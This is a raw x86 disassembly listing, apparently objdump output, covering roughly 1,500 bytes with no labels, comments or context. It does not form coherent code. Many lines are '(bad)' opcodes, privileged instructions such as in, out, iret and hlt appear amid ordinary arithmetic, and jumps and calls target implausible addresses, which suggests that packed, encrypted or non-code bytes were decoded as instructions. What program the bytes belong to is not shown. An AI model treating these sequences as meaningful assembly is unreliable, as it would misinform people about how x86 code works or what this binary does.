  41a6e0:	inc    ebp
  41a6e1:	adc    al,0x8b
  41a6e3:	inc    ebp
  41a6e4:	clc    
  41a6e5:	xor    eax,esi
  41a6e7:	add    eax,edi
  41a6e9:	mov    DWORD PTR [esi-0x24],ebx
  41a6ec:	rol    DWORD PTR [ebp-0x37],0x33
  41a6f0:	add    al,0x3
  41a6f2:	push   ebp
  41a6f3:	mov    esp,ebp
  41a6f5:	fsubr  st,st(4)
  41a6f7:	inc    ebp
  41a6f8:	(bad)  
  41a6f9:	mov    edi,esp
  41a6fb:	adc    BYTE PTR [ebp+0x30c3f8c7],al
  41a701:	add    DWORD PTR [ebp+edx*2-0x27173877],ebx
  41a708:	inc    ebp
  41a709:	test   DWORD PTR [ecx+0x454514f8],ecx
  41a70f:	xor    cl,BYTE PTR [ebx+0xc7909c]
  41a715:	fmul   DWORD PTR [ebx+0xf81485]
  41a71b:	test   DWORD PTR [ecx+0x8b0100],ecx
  41a721:	cld    
  41a722:	or     edi,eax
  41a724:	dec    eax
  41a725:	ret    
  41a726:	push   ebx
  41a727:	inc    ebp
  41a728:	dec    ebp
  41a729:	mov    ecx,DWORD PTR [ebx+0x5745fc14]
  41a72f:	mov    DWORD PTR [ebp-0x14],edx
  41a732:	push   ecx
  41a733:	jne    0x41a768
  41a735:	mov    edi,DWORD PTR [ebx+0x4d720c]
  41a73b:	call   0xff879903
  41a740:	mov    eax,DWORD PTR [ebp-0x4]
  41a743:	mov    edi,0x4585c3d8
  41a749:	clc    
  41a74a:	mov    eax,DWORD PTR [ebp-0x8]
  41a74d:	xor    eax,DWORD PTR [eax+0x3]
  41a750:	adc    DWORD PTR [eax+0xc],0x45
  41a754:	inc    ebp
  41a755:	push   eax
  41a756:	mov    ebx,ebp
  41a758:	clc    
  41a759:	inc    DWORD PTR [eax-0x75]
  41a75c:	mov    esi,eax
  41a75e:	clc    
  41a75f:	rol    BYTE PTR [ebp+0x4545544e],0x33
  41a766:	je     0x41a76b
  41a768:	mov    edx,DWORD PTR [eax+0x38]
  41a76b:	jne    0x41a7ba
  41a76d:	lea    ecx,[ebx-0x817ab44]
  41a773:	mul    BYTE PTR [ebx]
  41a775:	dec    DWORD PTR [ebx+0x4089f845]
  41a77b:	fadd   DWORD PTR [ebx]
  41a77d:	inc    ebp
  41a77e:	jmp    0x41a70b
  41a780:	mov    ecx,DWORD PTR [esp+edx*2]
  41a783:	rol    DWORD PTR [ebp+0x45],0x8b
  41a787:	mov    edi,esp
  41a789:	lock (bad) 
  41a78b:	dec    ebp
  41a78c:	ret    
  41a78d:	mov    eax,DWORD PTR [ebp+0x10]
  41a790:	mov    eax,DWORD PTR [ecx-0x4]
  41a793:	mov    eax,edi
  41a795:	fadd   st,st(3)
  41a797:	enter  0x1645,0x8b
  41a79b:	inc    ebp
  41a79c:	cld    
  41a79d:	mov    ecx,DWORD PTR [ebp+0xc]
  41a7a0:	xor    ecx,DWORD PTR [ebp+0x3]
  41a7a3:	add    ecx,DWORD PTR [ecx-0x27b276f8]
  41a7a9:	sub    eax,DWORD PTR [ebp-0x17]
  41a7ac:	xor    eax,DWORD PTR [edx]
  41a7ae:	pushf  
  41a7af:	add    bh,al
  41a7b1:	or     al,0xd8
  41a7b3:	jne    0x41a73a
  41a7b5:	(bad)  
  41a7b6:	clc    
  41a7b7:	mov    al,0x45
  41a7b9:	call   0xffde9dfb
  41a7be:	jmp    0xddaaf4
  41a7c3:	mov    DWORD PTR [ebp-0x30],eax
  41a7c6:	xor    eax,DWORD PTR [ebp+0x3]
  41a7c9:	xor    BYTE PTR [ecx+0x45c7f49c],cl
  41a7cf:	enter  0x8503,0xc
  41a7d3:	clc    
  41a7d4:	inc    ebp
  41a7d5:	inc    ebp
  41a7d6:	push   DWORD PTR [edx]
  41a7d8:	in     al,dx
  41a7d9:	pushf  
  41a7da:	jne    0x41a769
  41a7dc:	mov    edx,eax
  41a7de:	clc    
  41a7df:	dec    ebp
  41a7e0:	out    dx,eax
  41a7e1:	(bad)  
  41a7e2:	dec    esp
  41a7e4:	mov    DWORD PTR [ebp-0x10],ecx
  41a7e7:	lea    eax,[ebp-0x38]
  41a7ea:	cmp    DWORD PTR [ebp-0x64],ecx
  41a7ed:	lea    ecx,[ebx-0x38b2273c]
  41a7f3:	mov    eax,ebx
  41a7f5:	cld    
  41a7f6:	(bad)  
  41a7f7:	iret   
  41a7f8:	mov    esp,0xf74de8cb
  41a7fd:	jmp    0x86aa01
  41a802:	test   DWORD PTR [ebx],esi
  41a804:	je     0x41a7a2
  41a806:	mov    ecx,DWORD PTR [edi]
  41a808:	fdivr  st,st(6)
  41a80a:	mov    DWORD PTR [eax],0xe8ff8bc3
  41a810:	lock iret 
  41a812:	inc    ebp
  41a813:	lock push eax
  41a815:	retf   
  41a816:	imul   ecx,DWORD PTR [ebp-0x1],0xecd88b8b
  41a81d:	test   DWORD PTR [ebp-0x7c],0x32d89c8b
  41a824:	dec    ebp
  41a825:	mov    DWORD PTR [ebx],ebp
  41a827:	fmul   DWORD PTR [ecx+0x458bd845]
  41a82d:	fmul   DWORD PTR [ebx+0x40c3f0c7]
  41a833:	enter  0x1303,0xc
  41a837:	inc    ebp
  41a838:	dec    ebp
  41a839:	xor    edi,DWORD PTR [ebx]
  41a83b:	add    esi,DWORD PTR [edx+0x50]
  41a83e:	mov    ecx,DWORD PTR [eax+esi*8]
  41a841:	inc    ebp
  41a842:	inc    eax
  41a843:	push   eax
  41a844:	mov    ebp,esp
  41a846:	lock inc DWORD PTR [ecx-0x75]
  41a84a:	mov    esp,esp
  41a84c:	fadd   DWORD PTR [eax]
  41a84e:	rol    edi,0xee
  41a851:	test   BYTE PTR [eax],al
  41a853:	dec    esp
  41a854:	push   0x32
  41a856:	dec    DWORD PTR [ebx-0x30ba0314]
  41a85c:	push   eax
  41a85d:	mov    dh,0x21
  41a85f:	add    edi,edi
  41a861:	cmp    edi,DWORD PTR [eax-0x7877af1]
  41a867:	add    BYTE PTR [ebp-0x75],al
  41a86a:	(bad)  
  41a86b:	loopne 0x41a839
  41a86d:	add    BYTE PTR [ebp+0x4584f8c7],al
  41a873:	dec    esp
  41a874:	xor    esi,DWORD PTR [edx]
  41a876:	pushf  
  41a877:	mov    eax,edi
  41a879:	cld    
  41a87a:	(bad)  
  41a87b:	iret   
  41a87c:	test   DWORD PTR [esi+0x3b4d03f8],esi
  41a882:	mov    DWORD PTR [edi],ecx
  41a884:	in     al,0x58
  41a886:	dec    ebp
  41a887:	add    BYTE PTR [ecx+0x4df0e08b],cl
  41a88d:	add    BYTE PTR [ecx+0x4d84f0c7],cl
  41a893:	dec    esp
  41a894:	mov    DWORD PTR [edx],esi
  41a896:	fmul   QWORD PTR [ebx-0x30cc03b3]
  41a89c:	add    esi,DWORD PTR [esi+0x3bd80389]
  41a8a2:	test   DWORD PTR [edi],0x3d3800
  41a8a8:	test   DWORD PTR [ebx+0x84dcf8],ecx
  41a8ae:	add    edi,eax
  41a8b0:	add    BYTE PTR [ebp+ecx*2-0x74cdccb4],al
  41a8b7:	mov    eax,DWORD PTR [ebx]
  41a8b9:	cld    
  41a8ba:	mov    edi,ecx
  41a8bc:	hlt    
  41a8bd:	mov    dh,0x45
  41a8bf:	add    esi,DWORD PTR [ebx]
  41a8c1:	cmp    ecx,DWORD PTR [ebp+0x7218300f]
  41a8c7:	add    BYTE PTR [eax],al
  41a8c9:	mov    eax,DWORD PTR [ebp-0x20]
  41a8cc:	mov    eax,DWORD PTR [eax]
  41a8ce:	call   0x33c5f69a
  41a8d3:	dec    esp
  41a8d4:	add    esi,DWORD PTR [edx]
  41a8d6:	cmp    ecx,DWORD PTR [ebx+0x98be475]
  41a8dc:	cld    
  41a8dd:	iret   
  41a8de:	(bad)  
  41a8df:	mov    ebx,es
  41a8e1:	dec    esp
  41a8e2:	push   0x32
  41a8e4:	lea    esi,[edx]
  41a8e6:	mov    al,0x8b
  41a8e8:	call   0xff4ba3dd
  41a8ed:	iret   
  41a8ee:	inc    ebp
  41a8ef:	mov    WORD PTR [ebx-0x75cdccb4],cs
  41a8f5:	or     al,BYTE PTR ds:0xe4728b
  41a8fb:	or     DWORD PTR [ebp-0x31],ecx
  41a8fe:	xor    ecx,DWORD PTR [edi+ecx*1-0x34cd3fb0]
  41a905:	cmp    al,cl
  41a907:	je     0x41aae1
  41a90d:	mov    eax,DWORD PTR [ebp-0x10]
  41a910:	mov    eax,DWORD PTR [eax]
  41a912:	xor    eax,edi
  41a914:	mov    al,BYTE PTR [ebp+eax*1+0x32724c]
  41a91b:	mov    ecx,DWORD PTR [ebp-0x20]
  41a91e:	xor    ecx,DWORD PTR [ecx]
  41a920:	bswap  edi
  41a922:	ror    BYTE PTR [ebx+ecx*8-0x7bcd3eb4],0x32
  41a92a:	add    DWORD PTR [ebx+0x945dc00],ecx
  41a930:	mov    ecx,edi
  41a932:	xor    ecx,DWORD PTR [edx+ecx*4+0x7232054c]
  41a939:	or     al,BYTE PTR [eax]
  41a93b:	mov    ecx,DWORD PTR [ebp-0x20]
  41a93e:	xor    ecx,DWORD PTR [ecx]
  41a940:	bswap  edi
  41a942:	ror    BYTE PTR [ebx+ecx*8-0x7bcd3eb0],0x3a
  41a94a:	add    DWORD PTR [edi],ecx
  41a94c:	add    BYTE PTR [eax-0x7474ffbb],dl
  41a952:	xor    ebx,esp
  41a954:	mov    al,BYTE PTR [eax]
  41a956:	add    eax,0x8472c7
  41a95b:	dec    esp
  41a95c:	dec    ebp
  41a95d:	xor    dh,BYTE PTR [ebx]
  41a95f:	mov    ecx,DWORD PTR [edi]
  41a961:	lock ror BYTE PTR [ecx],0xcb
  41a965:	iret   
  41a966:	ror    DWORD PTR [esp+eax*4+0x32014c],0x32
  41a96e:	inc    ebp
  41a96f:	mov    ecx,DWORD PTR [ebx-0x75f6cc1c]
  41a975:	iret   
  41a976:	add    eax,0x4c728c
  41a97b:	xor    cl,BYTE PTR [ebp+0xa]
  41a97e:	mov    ecx,DWORD PTR [ebx+0x98af033]
  41a984:	or     eax,0x8c72cf
  41a989:	push   eax
  41a98a:	shl    DWORD PTR [edx],0x4d
  41a98d:	cmp    cl,BYTE PTR [ebx-0x7574cc8b]
  41a993:	fmul   QWORD PTR ds:0xc77200
  41a999:	test   cl,al
  41a99b:	dec    esp
  41a99c:	dec    ebp
  41a99d:	xor    cl,BYTE PTR [ebx-0x751bcc75]
  41a9a3:	or     DWORD PTR ds:0x8c72cf,ecx
  41a9a9:	dec    esp
  41a9aa:	enter  0x8532,0x32
  41a9ae:	add    BYTE PTR [ebx+0x945e000],cl
  41a9b4:	mov    ecx,edi
  41a9b6:	xor    ecx,DWORD PTR [edx+ecx*4+0x7232054c]
  41a9bd:	or     al,BYTE PTR [eax]
  41a9bf:	mov    ecx,DWORD PTR [ebp-0x24]
  41a9c2:	mov    ecx,DWORD PTR [ecx]
  41a9c4:	xor    ecx,edi
  41a9c6:	mov    cl,BYTE PTR [ebp+ecx*1+0x327250]
  41a9cd:	cmp    al,cl
  41a9cf:	jne    0x41aa1e
  41a9d1:	lea    ecx,[ebx-0x7517cc50]
  41a9d7:	sti    
  41a9d8:	or     eax,0x4d72ff
  41a9dd:	cmp    eax,ecx
  41a9df:	je     0x41aa2e
  41a9e1:	mov    ecx,DWORD PTR [ebx-0x7538cc04]
  41a9e7:	ret    
  41a9e8:	or     eax,0x8b7245
  41a9ed:	call   0x84c771ba
  41a9f2:	add    BYTE PTR [eax+eax*1-0x74ccbace],bl
  41a9f9:	mov    esi,DWORD PTR [ebx]
  41a9fb:	cld    
  41a9fc:	mov    dl,BYTE PTR [ebp+0x5]
  41a9ff:	xor    esi,DWORD PTR [edx+0x3]
  41aa02:	add    BYTE PTR [ebx],bh
  41aa04:	dec    ebp
  41aa05:	jnp    0x8b40de02
  41aa0b:	mov    ecx,DWORD PTR ds:0x4d72fc
  41aa11:	xor    eax,ecx
  41aa13:	add    ecx,DWORD PTR [ebp+0x3b]
  41aa16:	mov    esi,DWORD PTR [ebp+0x33]
  41aa19:	mov    ecx,DWORD PTR [edx+0x724d0de8]
  41aa1f:	xor    eax,DWORD PTR [eax]
  41aa21:	(bad)  
  41aa22:	ror    DWORD PTR [eax],0x4d
  41aa25:	jb     0x41a9b2
  41aa27:	add    BYTE PTR [ebx],dh
  41aa29:	ja     0x41a9b5
  41aa2b:	sbb    BYTE PTR ds:0x8d7275,cl
  41aa31:	cwde   
  41aa32:	enter  0x50e8,0xf3
  41aa36:	inc    ebp
  41aa37:	dec    DWORD PTR [ebx-0x7574ccbb]
  41aa3d:	fadd   DWORD PTR ds:0xc372c7
  41aa43:	ror    DWORD PTR [ebp+0x13],0x8b
  41aa47:	inc    ebp
  41aa48:	xor    esi,DWORD PTR [ebx]
  41aa4a:	mov    al,BYTE PTR [ebx]
  41aa4c:	or     eax,0x187250
  41aa51:	inc    ebp
  41aa52:	rcl    DWORD PTR [eax+0x4d],0xdc
  41aa56:	mov    edi,edi
  41aa58:	xor    ecx,DWORD PTR [ebx-0x3ff21376]
  41aa5e:	jb     0x41a9e9
  41aa60:	add    ah,bl
  41aa62:	shl    DWORD PTR [ebp+0x4d],0xff
  41aa66:	mov    ebx,esp
  41aa68:	xor    eax,DWORD PTR [ebp-0x76]
  41aa6b:	add    ecx,DWORD PTR ds:0xe87208
  41aa71:	repz enter 0x10ff,0x45
  41aa76:	inc    ebp
  41aa77:	mov    edx,DWORD PTR [eax-0x28]
  41aa7a:	xor    bh,al
  41aa7c:	inc    ebx
  41aa7e:	mov    eax,ecx
  41aa80:	mov    eax,0xa00c111
  41aa85:	jne    0x41aacc
  41aa87:	mov    esi,DWORD PTR [ebx]
  41aa89:	test   al,0x3
  41aa8b:	inc    ebp
  41aa8c:	mov    DWORD PTR [eax-0xc],edx
  41aa8f:	mov    ds:0x8b33ff45,al
  41aa94:	lea    edx,[eax]
  41aa96:	xor    BYTE PTR [ebp+0x72],cl
  41aa99:	add    DWORD PTR [eax],eax
  41aa9b:	mov    eax,edi
  41aa9d:	lods   al,BYTE PTR ds:[esi]
  41aa9e:	dec    ebp
  41aa9f:	inc    ebp
  41aaa0:	mov    ecx,DWORD PTR [ecx+0x45cf14f4]
  41aaa6:	retf   
  41aaa7:	mov    edx,ecx
  41aaa9:	adc    al,0x84
  41aaab:	(bad)  
  41aaac:	std    
  41aaad:	ret    
  41aaae:	jmp    FWORD PTR [edi-0x37474bb]
  41aab4:	hlt    
  41aab5:	push   ebp
  41aab6:	(bad)  
  41aab7:	xor    eax,ebx
  41aab9:	(bad)  
  41aaba:	enter  0x1111,0x72
  41aabe:	inc    ebp
  41aabf:	add    BYTE PTR [ebx-0x387deb3f],cl
  41aac5:	cld    
  41aac6:	test   bh,bh
  41aac8:	pushf  
  41aac9:	inc    ebp
  41aaca:	xor    bl,BYTE PTR [edi-0x15]
  41aacd:	pop    ebx
  41aace:	push   0xffffffc2
  41aad0:	inc    DWORD PTR [eax]
  41aad2:	in     al,dx
  41aad3:	mov    eax,DWORD PTR [ebp+0x51]
  41aad6:	push   eax
  41aad7:	inc    ebp
  41aad8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41aad9:	mov    edi,edi
  41aadb:	or     BYTE PTR [ebx+0x4d80fc16],cl
  41aae1:	add    DWORD PTR [ebx],esi
  41aae3:	add    BYTE PTR [ebx],al
  41aae5:	add    BYTE PTR [ebx],bh
  41aae7:	icebp  
  41aae8:	je     0x41aaf2
  41aaea:	mov    eax,DWORD PTR [edi]
  41aaec:	cld    
  41aaed:	rol    edi,0x72
  41aaf0:	ret    
  41aaf1:	add    BYTE PTR [edx-0x2f],ch
  41aaf4:	lea    edx,[eax]
  41aaf6:	cwde   
  41aaf7:	jne    0x41aae1
  41aaf9:	(bad)  
  41aafa:	clc    
  41aafb:	or     al,0xff
  41aafd:	inc    DWORD PTR [ebp-0x18]
  41ab00:	cmp    ebx,0x18
  41ab03:	inc    DWORD PTR [ebp+0x6]
  41ab06:	call   FWORD PTR [ebp-0x54]
  41ab09:	or     al,0x75
  41ab0b:	push   ebp
  41ab0c:	mov    ebp,esp
  41ab0e:	test   al,0x53
  41ab10:	inc    ebp
  41ab11:	mov    edx,DWORD PTR [eax-0x75]
  41ab14:	imul   ecx,DWORD PTR [eax],0xffffffff
  41ab17:	dec    ebp
  41ab18:	mov    edx,DWORD PTR [edi-0x4]
  41ab1b:	push   ebp
  41ab1c:	dec    ebp
  41ab1d:	push   ecx
  41ab1e:	xor    esi,DWORD PTR [ebx]
  41ab20:	add    edi,DWORD PTR [edi+0x74723b]
  41ab26:	push   0xffffffc7
  41ab28:	inc    DWORD PTR [ecx]
  41ab2a:	lods   al,BYTE PTR ds:[esi]
  41ab2b:	inc    ebp
  41ab2c:	inc    ebp
  41ab2d:	mov    eax,DWORD PTR [ebx]
  41ab2f:	xchg   esp,eax
  41ab30:	or     BYTE PTR [eax],al
  41ab32:	call   0xffcda3c2
  41ab37:	adc    al,0x45
  41ab39:	or     BYTE PTR [ebx+0x800ac01],0x0
  41ab40:	inc    ebp
  41ab41:	inc    ecx
  41ab42:	add    ecx,DWORD PTR [ebx-0x76baebec]
  41ab48:	mov    eax,DWORD PTR [ecx]
  41ab4a:	call   0x338af84f
  41ab4f:	push   0x3
  41ab51:	push   0xc1300f
  41ab56:	dec    ebp
  41ab57:	jo     0x41aae4
  41ab59:	push   0xffffffd4
  41ab5b:	dec    edi
  41ab5d:	mov    DWORD PTR [ebx+ecx*4-0x3ccdf764],ecx
  41ab64:	cmp    eax,edi
  41ab66:	cmovne edx,DWORD PTR [edi-0x75]
  41ab6a:	call   DWORD PTR [eax]
  41ab6c:	mov    eax,DWORD PTR [ebp+0x8]
  41ab6f:	call   FWORD PTR [esi+0x14]
  41ab72:	leave  
  41ab73:	inc    ebp
  41ab74:	adc    BYTE PTR [eax+0x55],dl
  41ab77:	jne    0x41ab65
  41ab79:	call   0xff52ab09
  41ab7e:	dec    ebp
  41ab7f:	inc    ebp
  41ab80:	mov    ecx,DWORD PTR [ebx+0x390338b]
  41ab86:	add    BYTE PTR [ebx],bh
  41ab88:	mov    esi,DWORD PTR [ecx+eax*4-0x75]
  41ab8c:	push   ebp
  41ab8d:	or     al,0x51
  41ab8f:	dec    ebp
  41ab90:	xor    DWORD PTR [ebx],0xf32039c
  41ab96:	cmp    eax,DWORD PTR [ebp+0x74]
  41ab99:	mov    edi,edi
  41ab9b:	pop    edi
  41ab9c:	adc    BYTE PTR [ebx+0x75],bl
  41ab9f:	ret    0x50
  41aba2:	mov    ecx,DWORD PTR ss:[edx-0x7d]
  41aba6:	(bad)  
  41aba7:	clc    
  41aba8:	mov    esp,ebp
  41abaa:	pop    ecx
  41abab:	mov    ecx,0xf80085c2
  41abb0:	mov    ecx,DWORD PTR [ecx+edx*2]
  41abb3:	push   esi
  41abb4:	push   esi
  41abb5:	(bad)  
  41abb6:	lock inc DWORD PTR [ebp+0x44]
  41abba:	mov    edx,DWORD PTR [eax]
  41abbc:	adc    BYTE PTR [ebx+edi*4+0x8],bh
  41abc0:	or     BYTE PTR [ebp+0x7],dl
  41abc3:	push   ecx
  41abc4:	ret    
  41abc5:	xor    ebx,DWORD PTR [esi+edi*4+0x37232]
  41abcc:	mov    esi,edi
  41abce:	mov    edi,DWORD PTR [esp+edx*1+0xc]
  41abd2:	cmp    BYTE PTR [ebp+0x1],0x89
  41abd6:	add    BYTE PTR [eax+ecx*1],ah
  41abd9:	cmp    DWORD PTR [ebp+0x10],eax
  41abdc:	mov    edx,DWORD PTR [esi]
  41abde:	xchg   esp,eax
  41abdf:	dec    esp
  41abe0:	add    BYTE PTR [eax],dl
  41abe2:	mov    ecx,edx
  41abe4:	add    edx,DWORD PTR [esp+edi*1+0x8]
  41abe8:	dec    ebp
  41abe9:	into   
  41abea:	mov    ebp,DWORD PTR [edi+0x240089d8]
  41abf0:	mov    edx,DWORD PTR [eax+0x14]
  41abf3:	das    
  41abf4:	add    al,0x45
  41abf6:	add    BYTE PTR [ebp+0x0],dh
  41abf9:	mov    edi,edi
  41abfb:	and    al,0x50
  41abfd:	mov    eax,DWORD PTR [eax]
  41abff:	and    al,0xd1
  41ac01:	xor    eax,DWORD PTR [esi]
  41ac03:	lea    eax,[ebp+0x8]
  41ac06:	xor    esi,DWORD PTR [edx+0x3]
  41ac09:	add    BYTE PTR [ecx+0x4510fc44],cl
  41ac0f:	xor    ecx,DWORD PTR [ebx+0x75eb0c9c]
  41ac15:	or     DWORD PTR [ebp-0x7a03f0],0x541608f8
  41ac1f:	xor    bh,bh
  41ac21:	pushf  
  41ac22:	mov    edi,edi
  41ac24:	or     BYTE PTR [esi+ecx*1],cl
  41ac27:	jne    0x41abec
  41ac29:	call   0xaabf5
  41ac2e:	adc    BYTE PTR [ebp+eax*2+0xc],al
  41ac32:	mov    ebx,DWORD PTR [eax]
  41ac34:	adc    BYTE PTR [ebx+eax*8+0x14],dh
  41ac38:	mov    DWORD PTR [edi+ebp*4-0x73],0x750110fc
  41ac40:	pop    esi
  41ac41:	dec    ecx
  41ac43:	and    al,0x10
  41ac45:	call   DWORD PTR [ebp+0x24]
  41ac48:	in     al,dx
  41ac49:	call   0xffc5ab32
  41ac4e:	adc    BYTE PTR [ecx+esi*1+0xc],al
  41ac52:	pushf  
  41ac53:	pop    esi
  41ac54:	mov    ebp,esp
  41ac56:	and    al,0xc2
  41ac58:	push   edi
  41ac59:	add    BYTE PTR [ecx+0x33],al
  41ac5c:	mov    DWORD PTR [ebp+0x24],esi
  41ac5f:	test   DWORD PTR [ebx-0x45f7db8b],ecx
  41ac65:	dec    DWORD PTR [eax]
  41ac67:	and    al,0x7
  41ac69:	(bad)  
  41ac6a:	cli    
  41ac6b:	and    al,0x9c
  41ac6d:	or     BYTE PTR [edx],dh
  41ac6f:	sbb    BYTE PTR [ebx],al
  41ac71:	adc    al,0x89
  41ac73:	jmp    DWORD PTR [esp]
  41ac76:	mov    ecx,DWORD PTR [ebx+0x1c7c0c0c]
  41ac7c:	adc    al,0x8
  41ac7e:	dec    ebp
  41ac7f:	adc    BYTE PTR [ebp-0x7c],dh
  41ac82:	mov    esi,DWORD PTR [edx]
  41ac84:	and    al,0x24
  41ac86:	xor    eax,DWORD PTR [ebp-0x63dbf175]
  41ac8c:	add    edi,eax
  41ac8e:	pcmpeqb mm1,mm2
  41ac91:	jmp    0x41acdf
  41ac93:	dec    DWORD PTR [eax]
  41ac95:	je     0x41ac82
  41ac97:	mov    edi,DWORD PTR [ecx]
  41ac99:	pop    ebp
  41ac9a:	adc    BYTE PTR [esp+ecx*2-0x3e],al
  41ac9e:	pushf  
  41ac9f:	mov    DWORD PTR [eax-0x8],ebp
  41aca2:	jge    0x41ad0c
  41aca4:	dec    DWORD PTR [ecx+0x5fbf7424]
